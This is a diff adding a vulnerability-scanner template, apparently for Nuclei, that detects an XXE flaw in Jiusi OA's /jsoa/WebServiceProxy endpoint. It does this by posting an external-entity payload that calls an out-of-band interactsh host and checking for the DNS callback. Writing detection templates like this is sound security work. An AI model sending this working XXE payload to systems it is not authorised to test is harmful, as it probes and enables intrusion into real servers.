@@ -1,0 +1,29 @@
+id: poc-yaml-jiusi-oa-webserviceproxy-xxe
+info:
+  name: Jiusi OA WebServiceProxy XXE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: xxe,dns
+
+variables:
+  reverse: "{{interactsh-url}}"
+
+http:
+  - method: POST
+    path:
+      - "/jsoa/WebServiceProxy"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |-
+      <!DOCTYPE root [ <!ENTITY % remote SYSTEM "https://{{reverse}}"> %remote;]>
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: word
+        part: interactsh_request
+        words:
+          - "<!DOCTYPE root"
